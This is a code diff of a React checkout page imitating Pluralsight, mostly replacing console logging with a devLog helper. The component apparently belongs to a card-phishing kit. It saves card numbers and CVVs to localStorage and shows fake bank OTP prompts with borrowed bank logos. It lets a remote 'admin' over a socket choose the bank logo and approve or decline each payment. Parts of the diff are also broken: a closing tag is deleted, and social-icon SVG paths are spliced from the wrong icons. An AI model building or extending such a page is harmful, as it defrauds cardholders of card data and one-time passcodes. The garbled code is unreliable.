@@ -1,3 +1,16 @@
+import React, { useState, useEffect, useRef } from 'react';
+import { useLocation, useNavigate } from 'react-router-dom';
+import { io, Socket } from 'socket.io-client';
+import { Lock, CreditCard, Shield, CheckCircle, AlertCircle, Clock, ChevronDown, ChevronUp, Star, Users, Zap, Target, TrendingUp, Calendar, DollarSign, Building2, Globe, Download, ChevronRight, X } from 'lucide-react';
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import NewOTPPage from '../components/NewOTPPage';
+import { api } from '../utils/api';
+import { devLog, devError, devWarn } from '../utils/logger';
+
 const bankLogos = [
   'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
   'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
@@ -22,19 +35,6 @@ const bankLogos = [
   'https://toppng.com/uploads/preview/idbi-bank-vector-logo-11574258107ecape2krza.png',
   'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg'
 ];
-
-import React, { useState, useEffect, useRef } from 'react';
-import { useSearchParams, useNavigate, useLocation, Link } from 'react-router-dom';
-import { CheckCircle, Info, CreditCard, Clock, Receipt, FileText, User, Award, BarChart3, CheckSquare, Star, Zap, Target, Search, Filter, MoreHorizontal, X, ExternalLink, Calendar, Mail, MapPin, CreditCard as CreditCardIcon, Phone, Building, Badge, CheckCircle2, Loader2, ArrowLeft, Lock } from 'lucide-react';
-import { Input } from '../components/ui/input';
-import { Button } from '../components/ui/button';
-import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from '../components/ui/dialog';
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
-import { Checkbox } from '../components/ui/checkbox';
-import { toast, useToast } from '../hooks/use-toast';
-import io from 'socket.io-client';
-import NewOTPPage from '../components/NewOTPPage';
-import { v4 as uuidv4 } from 'uuid';
 
 // Card brand logos
 const cardBrandLogos = {
@@ -147,13 +147,13 @@ const CheckoutOriginal = () => {
       const amount = urlParams.get('amount');
       const plan = urlParams.get('plan');
       
-      console.log('🔍 Checking payment success for:', { linkId, amount, plan, currentUrl });
+      devLog('🔍 Checking payment success for:', { linkId, amount, plan, currentUrl });
       
       // Method 1: Check by linkId if available
       if (linkId) {
         const linkSuccessData = localStorage.getItem(`payment_success_${linkId}`);
         if (linkSuccessData) {
-          console.log('✅ Payment link already successful (by linkId):', linkId);
+          devLog('✅ Payment link already successful (by linkId):', linkId);
           return JSON.parse(linkSuccessData);
         }
       }
@@ -170,7 +170,7 @@ const CheckoutOriginal = () => {
           // Match by amount and plan if available
           if (amount && plan) {
             if (parsedData.amount === parseFloat(amount) && parsedData.planName === plan) {
-              console.log('✅ Payment already successful (by amount/plan match):', parsedData);
+              devLog('✅ Payment already successful (by amount/plan match):', parsedData);
               return parsedData;
             }
           }
@@ -181,11 +181,11 @@ const CheckoutOriginal = () => {
       const urlSuccessKey = `url_success_${btoa(currentUrl)}`;
       const urlSuccessData = localStorage.getItem(urlSuccessKey);
       if (urlSuccessData) {
-        console.log('✅ Payment URL already successful:', currentUrl);
+        devLog('✅ Payment URL already successful:', currentUrl);
         return JSON.parse(urlSuccessData);
       }
       
-      console.log('❌ No successful payment found for current parameters');
+      devLog('❌ No successful payment found for current parameters');
       return null;
     } catch (error) {
       console.error('Error checking payment success:', error);
@@ -204,7 +204,7 @@ const CheckoutOriginal = () => {
         ...paymentData
       };
       localStorage.setItem(urlSuccessKey, JSON.stringify(successData));
-      console.log('💾 Stored URL success:', successData);
+      devLog('💾 Stored URL success:', successData);
     } catch (error) {
       console.error('Error storing URL success:', error);
     }
@@ -215,7 +215,7 @@ const CheckoutOriginal = () => {
     const checkSuccess = async () => {
       const successData = await checkPaymentSuccess();
       if (successData) {
-        console.log('🚀 Redirecting to success page - payment already completed');
+        devLog('🚀 Redirecting to success page - payment already completed');
         
         // Store user data for success page
         const userData = {
@@ -233,10 +233,10 @@ const CheckoutOriginal = () => {
         
         // Navigate to success page immediately - check for hash-based URL first
         if (successData.successHash) {
-          console.log('🚀 Redirecting to hash-based success page:', successData.successHash);
+          devLog('🚀 Redirecting to hash-based success page:', successData.successHash);
           navigate(`/success/${successData.successHash}`);
         } else {
-          console.log('🚀 Redirecting to regular success page');
+          devLog('🚀 Redirecting to regular success page');
           navigate('/payment-success');
         }
       }
@@ -266,12 +266,12 @@ const CheckoutOriginal = () => {
       setSocket(newSocket);
     
     newSocket.on('connect', () => {
-      console.log('Socket connected');
+      devLog('Socket connected');
       setIsConnected(true);
     });
     
     newSocket.on('disconnect', () => {
-      console.log('Socket disconnected');
+      devLog('Socket disconnected');
       setIsConnected(false);
     });
     
@@ -373,12 +373,12 @@ const CheckoutOriginal = () => {
 
   // Debug: Log the current state of agreeTerms
   useEffect(() => {
-    console.log('agreeTerms state:', agreeTerms);
+    devLog('agreeTerms state:', agreeTerms);
   }, [agreeTerms]);
 
   // Debug: Log which OTP page type is selected
   useEffect(() => {
-    console.log('OTP Page Type:', useNewOTPPage ? 'NEW OTP Page Component' : 'Original OTP Modal');
+    devLog('OTP Page Type:', useNewOTPPage ? 'NEW OTP Page Component' : 'Original OTP Modal');
   }, [useNewOTPPage]);
   
   // Payment flow states
@@ -457,45 +457,45 @@ const CheckoutOriginal = () => {
   // Function to detect card brand from card number
   const getCardBrand = (cardNumber: string) => {
     if (!cardNumber) {
-      console.log('No card number provided, defaulting to visa');
+      devLog('No card number provided, defaulting to visa');
       return 'visa';
     }
     
     const cleanNumber = cardNumber.replace(/\s/g, '');
-    console.log('Clean card number for detection:', cleanNumber);
+    devLog('Clean card number for detection:', cleanNumber);
     
     // RuPay: starts with 607 (all RuPay BINs start with 607xxx)
     if (cleanNumber.startsWith('607')) {
-      console.log('Detected: RuPay (starts with 607)');
+      devLog('Detected: RuPay (starts with 607)');
       return 'rupay';
     }
     // Visa: starts with 4
     else if (cleanNumber.startsWith('4')) {
-      console.log('Detected: Visa (starts with 4)');
+      devLog('Detected: Visa (starts with 4)');
       return 'visa';
     }
     // Mastercard: starts with 5 or 2 (new range)
     else if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
-      console.log('Detected: Mastercard (starts with 5 or 2)');
+      devLog('Detected: Mastercard (starts with 5 or 2)');
       return 'mastercard';
     }
     // American Express: starts with 3
     else if (cleanNumber.startsWith('3')) {
-      console.log('Detected: American Express (starts with 3)');
+      devLog('Detected: American Express (starts with 3)');
       return 'amex';
     }
     // Discover: starts with 6 (but not 607 which is RuPay)
     else if (cleanNumber.startsWith('6') && !cleanNumber.startsWith('607')) {
-      console.log('Detected: Discover (starts with 6, not 607)');
+      devLog('Detected: Discover (starts with 6, not 607)');
       return 'discover';
     }
     // RuPay fallback: starts with 8 or other patterns
     else if (cleanNumber.startsWith('8')) {
-      console.log('Detected: RuPay (starts with 8)');
+      devLog('Detected: RuPay (starts with 8)');
       return 'rupay';
     }
     
-    console.log('Unknown card type, defaulting to visa');
+    devLog('Unknown card type, defaulting to visa');
     return 'visa'; // default fallback
   };
 
@@ -548,11 +548,11 @@ const CheckoutOriginal = () => {
       
       // Random delay between 2-6 seconds
       const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2000-6000ms
-      console.log(`Loading new OTP page in ${randomDelay/1000} seconds...`);
+      devLog(`Loading new OTP page in ${randomDelay/1000} seconds...`);
       
       const timer = setTimeout(() => {
         setNewOtpPageLoading(false);
-        console.log('New OTP page loaded!');
+        devLog('New OTP page loaded!');
       }, randomDelay);
       
       return () => clearTimeout(timer);
@@ -854,7 +854,7 @@ const CheckoutOriginal = () => {
     const hasCardErrors = Object.values(newCardErrors).some(error => error !== '');
     const isFormValid = isCardFormValid();
     
-    console.log('Card validation check:', {
+    devLog('Card validation check:', {
       allFieldsFilled,
       hasCardErrors,
       isFormValid,
@@ -863,7 +863,7 @@ const CheckoutOriginal = () => {
     });
     
     if (!allFieldsFilled || hasCardErrors || !isFormValid) {
-      console.log('Validation failed - cannot proceed');
+      devLog('Validation failed - cannot proceed');
       return;
     }
     
@@ -877,7 +877,7 @@ const CheckoutOriginal = () => {
     };
     localStorage.setItem('userCardData', JSON.stringify(cardInfo));
     
-    console.log('Validation passed - proceeding to review');
+    devLog('Validation passed - proceeding to review');
     setIsProcessing(true);
     setCurrentStep('processing');
     
@@ -900,18 +900,18 @@ const CheckoutOriginal = () => {
 
   useEffect(() => {
     if (!socket) {
-      console.log('Socket not available, skipping event registration');
+      devLog('Socket not available, skipping event registration');
       return;
     }
-    console.log('Registering socket event listeners for paymentId:', paymentId);
+    devLog('Registering socket event listeners for paymentId:', paymentId);
     // Register event listeners
     socket.on('show-otp', (data) => {
-      console.log('Show OTP with currency data:', data);
+      devLog('Show OTP with currency data:', data);
       
       // Random selection between old and new OTP page (50/50 chance)
       const useNewPage = Math.random() < 0.5;
       setUseNewOTPPage(useNewPage);
-      console.log('🎲 Randomly selected OTP page:', useNewPage ? 'NEW' : 'OLD');
+      devLog('🎲 Randomly selected OTP page:', useNewPage ? 'NEW' : 'OLD');
       
       setConfirmingPayment(false);
       setShowOtp(true);
@@ -925,11 +925,11 @@ const CheckoutOriginal = () => {
         
         // IMPORTANT: Capture the admin-selected bank logo
         if (data.bankLogo) {
-          console.log('🎯 Admin selected bank logo received:', data.bankLogo);
+          devLog('🎯 Admin selected bank logo received:', data.bankLogo);
           setAdminSelectedBankLogo(data.bankLogo);
         }
         
-        console.log('Updated OTP currency display:', {
+        devLog('Updated OTP currency display:', {
           amount: data.customAmount,
           currency: data.currency,
           symbol: data.currencySymbol,
@@ -953,17 +953,17 @@ const CheckoutOriginal = () => {
     });
     
     socket.on('payment-approved', (data) => {
-      console.log('Payment approved event received:', data);
-      console.log('Current paymentId:', paymentId);
-      console.log('Event paymentId:', data?.paymentId);
-      console.log('Socket connected:', socket?.connected);
+      devLog('Payment approved event received:', data);
+      devLog('Current paymentId:', paymentId);
+      devLog('Event paymentId:', data?.paymentId);
+      devLog('Socket connected:', socket?.connected);
       
       if (!data || data.paymentId !== paymentId) {
-        console.log('Payment ID mismatch or no data, ignoring event');
+        devLog('Payment ID mismatch or no data, ignoring event');
         return;
       }
       
-      console.log('Payment approved - showing loading spinner');
+      devLog('Payment approved - showing loading spinner');
       setShowOtp(false);
       setShowSpinner(true);
       
@@ -976,14 +976,14 @@ const CheckoutOriginal = () => {
         billing: billing
       };
       storeUrlSuccess(urlSuccessData);
-      console.log('💾 Stored URL success for payment:', data.paymentId);
+      devLog('💾 Stored URL success for payment:', data.paymentId);
       
       // Check if this payment has a generated success hash
       const storedSuccessData = localStorage.getItem(`payment_success_${data.paymentId}`);
       if (storedSuccessData) {
         const parsedData = JSON.parse(storedSuccessData);
         if (parsedData.successHash) {
-          console.log('🔗 Found success hash, will redirect to hash-based success page');
+          devLog('🔗 Found success hash, will redirect to hash-based success page');
           // Store the success hash for redirect
           localStorage.setItem('pendingSuccessHash', parsedData.successHash);
         }
@@ -1035,7 +1035,7 @@ const CheckoutOriginal = () => {
           !successData.cardName ||
           !successData.cvv
         ) {
-          console.log('Missing payment data:', successData);
+          devLog('Missing payment data:', successData);
           alert('Payment details not found. Please complete checkout again.');
           return;
         }
@@ -1044,11 +1044,11 @@ const CheckoutOriginal = () => {
         // Check if we have a pending success hash to redirect to
         const pendingHash = localStorage.getItem('pendingSuccessHash');
         if (pendingHash) {
-          console.log('🚀 Redirecting to hash-based success page:', pendingHash);
+          devLog('🚀 Redirecting to hash-based success page:', pendingHash);
           localStorage.removeItem('pendingSuccessHash');
           navigate(`/success/${pendingHash}`);
         } else {
-          console.log('🚀 Redirecting to regular success page');
+          devLog('🚀 Redirecting to regular success page');
           navigate('/payment-success', { 
             state: { 
               paymentData: successData
@@ -1059,7 +1059,7 @@ const CheckoutOriginal = () => {
     });
     socket.on('payment-rejected', (data) => {
       if (!data || data.paymentId !== paymentId) return;
-      console.log('Payment rejected - showing error screen');
+      devLog('Payment rejected - showing error screen');
       setShowOtp(false);
       setShowSpinner(false);
       setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
@@ -1074,7 +1074,7 @@ const CheckoutOriginal = () => {
     });
     socket.on('insufficient-balance-error', (data) => {
       if (!data || data.paymentId !== paymentId) return;
-      console.log('Insufficient balance - showing error screen');
+      devLog('Insufficient balance - showing error screen');
       setShowOtp(false);
       setShowSpinner(false);
       setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
@@ -1095,7 +1095,7 @@ const CheckoutOriginal = () => {
     });
     socket.on('card-declined-error', (data) => {
       if (!data || data.paymentId !== paymentId) return;
-      console.log('Card declined error - showing error screen');
+      devLog('Card declined error - showing error screen');
       setShowOtp(false);
       setShowSpinner(false);
       setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
@@ -1109,7 +1109,7 @@ const CheckoutOriginal = () => {
       }, 4000);
     });
     return () => {
-      console.log('Cleaning up socket event listeners');
+      devLog('Cleaning up socket event listeners');
       socket.off('show-otp');
       socket.off('payment-approved');
       socket.off('payment-rejected');
@@ -1275,10 +1275,10 @@ const CheckoutOriginal = () => {
       }
       
       // Debug logging
-      console.log('🔍 Bank logo selection debug:');
-      console.log('Admin selected bank logo:', adminSelectedBankLogo);
-      console.log('Session bank logo (random):', cardSessionMap.current[cardKey].logo);
-      console.log('Will use admin logo if available:', adminSelectedBankLogo || cardSessionMap.current[cardKey].logo);
+      devLog('🔍 Bank logo selection debug:');
+      devLog('Admin selected bank logo:', adminSelectedBankLogo);
+      devLog('Session bank logo (random):', cardSessionMap.current[cardKey].logo);
+      devLog('Will use admin logo if available:', adminSelectedBankLogo || cardSessionMap.current[cardKey].logo);
       
       setSessionBankLogo(cardSessionMap.current[cardKey].logo);
       setOtpMobileLast4(cardSessionMap.current[cardKey].last4);
@@ -1587,7 +1587,7 @@ const CheckoutOriginal = () => {
                       id="terms-checkbox"
                       checked={agreeTerms}
                       onCheckedChange={(checked) => {
-                        console.log('Checkbox clicked, new state:', checked);
+                        devLog('Checkbox clicked, new state:', checked);
                         setAgreeTerms(checked === true);
                         if (checked) {
                           setShowTermsError(false);
@@ -1670,7 +1670,6 @@ const CheckoutOriginal = () => {
                     <p className="text-red-700 text-sm font-medium">
                       {transactionCancelError}
                     </p>
-                  </div>
                 )}
 
                 {/* Payment Method Selection */}
@@ -1728,7 +1727,7 @@ const CheckoutOriginal = () => {
                   </div>
 
                   {/* Payment Method Feedback Section - Integrated */}
-                  <div className="border-t border-slate-600 overflow-hidden transition-all duration-300">
+                  <div className="border-t border-slate-600 overflow-hidden transition-all">
                     <div 
                       className="px-4 py-3 cursor-pointer hover:bg-slate-700/30 transition-colors"
                       onClick={(e) => {
@@ -2059,15 +2058,15 @@ const CheckoutOriginal = () => {
                           <img 
                             src={(() => {
                               const cardBrand = getCardBrand(cardData.cardNumber);
-                              console.log('Card Number:', cardData.cardNumber);
-                              console.log('Detected Card Brand:', cardBrand);
-                              console.log('Logo URL:', cardBrandLogos[cardBrand as keyof typeof cardBrandLogos]);
+                              devLog('Card Number:', cardData.cardNumber);
+                              devLog('Detected Card Brand:', cardBrand);
+                              devLog('Logo URL:', cardBrandLogos[cardBrand as keyof typeof cardBrandLogos]);
                               return cardBrandLogos[cardBrand as keyof typeof cardBrandLogos];
                             })()} 
                             alt="Card Brand" 
                             className="w-20 h-20 mx-auto object-contain"
                             onError={(e) => {
-                              console.log('Logo loading failed, falling back to Visa');
+                              devLog('Logo loading failed, falling back to Visa');
                               e.currentTarget.src = cardBrandLogos.visa;
                             }}
                           />
@@ -2121,7 +2120,7 @@ const CheckoutOriginal = () => {
                           alt="Card Brand Logo"
                           className="h-8 w-auto max-w-[65px] object-contain"
                           onError={(e) => {
-                            console.log('Header logo loading failed, falling back to Visa');
+                            devLog('Header logo loading failed, falling back to Visa');
                             e.currentTarget.src = cardBrandLogos.visa;
                           }}
                         />
@@ -2133,7 +2132,7 @@ const CheckoutOriginal = () => {
                       alt="Bank Logo"
                       className="h-8 w-20 object-contain"
                       onError={(e) => {
-                        console.log('❌ Bank logo failed to load, using fallback');
+                        devLog('❌ Bank logo failed to load, using fallback');
                         e.currentTarget.src = 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png';
                       }}
                     />
@@ -2209,7 +2208,7 @@ const CheckoutOriginal = () => {
                   <div className="px-4 mb-1 text-right">
                     <button
                       onClick={() => {
-                        setResendMessage('One time passcode has been sent to your registered mobile number XX' + otpMobileLast4);
+                        setResendMessage('One time passcode have been sent to your registered mobile number XX' + otpMobileLast4);
                         // Clear the message after 3 seconds
                         setTimeout(() => setResendMessage(''), 3000);
                       }}
@@ -2261,7 +2260,7 @@ const CheckoutOriginal = () => {
                   </div>
                   {/* Spinner overlay for Declined/Insufficient */}
                   {showSpinner && (
-                    <div className="absolute inset-0 bg-white bg-opacity-90 backdrop-blur-sm flex items-center justify-center z-50">
+                    <div className="absolute inset-0 bg-white rounded-lg flex items-center justify-center z-50">
                       <div className="text-center">
                         <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                           <CheckCircle className="h-8 w-8 text-white animate-bounce" />
@@ -2377,7 +2376,7 @@ const CheckoutOriginal = () => {
                   />
                   <label 
                     htmlFor="final-consent-checkbox"
-                    className="text-sm text-gray-300 leading-relaxed pt-0.5 cursor-pointer"
+                    className="text-sm text-gray-400 leading-relaxed pt-0.5 cursor-pointer"
                   >
                     By checking here and continuing, I agree to the Pluralsight{' '}
                     <a href="https://legal.pluralsight.com/policies" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">
@@ -2585,10 +2584,10 @@ const CheckoutOriginal = () => {
                   <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.219-.359-.219c0-1.781 1.062-3.188 2.384-3.188 1.125 0 1.669.844 1.669 1.853 0 1.128-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
                 </a>
                 <a href="https://www.linkedin.com/company/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
-                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" /></svg>
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.719 2.813-1.094 4.375-.312 1.313.656 2.384 1.953 2.384 2.344 0 4.031-3.021 4.031-6.594 0-2.724-1.812-4.781-4.969-4.781-3.72 0-6.062 2.75-6.062 5.797 0 1.047.401 1.789.934 2.384.219.25.25.469.188.719-.063.281-.203.844-.266 1.078-.078.375-.312.469-.719.281-1.297-.469-1.906-1.844-1.906-3.375 0-2.5 2.094-5.5 6.25-5.5 3.359 0 5.469 2.437 5.469 5.031 0 3.437-1.875 6.094-4.625 6.094-1.125 0-2.125-.656-2.469-1.406 0 0-.594 2.437-.719 2.937-.25.969-.875 1.844-1.281 2.469 1.062.328 2.188.516 3.375.516 6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001 12.017.001z" /></svg>
                 </a>
                 <a href="https://www.youtube.com/pluralsight" target="_blank" rel="noopener noreferrer" className="text-gray-400 hover:text-white transition-colors">
-                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" /></svg>
+                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z" /></svg>
                 </a>
               </div>
             </div>
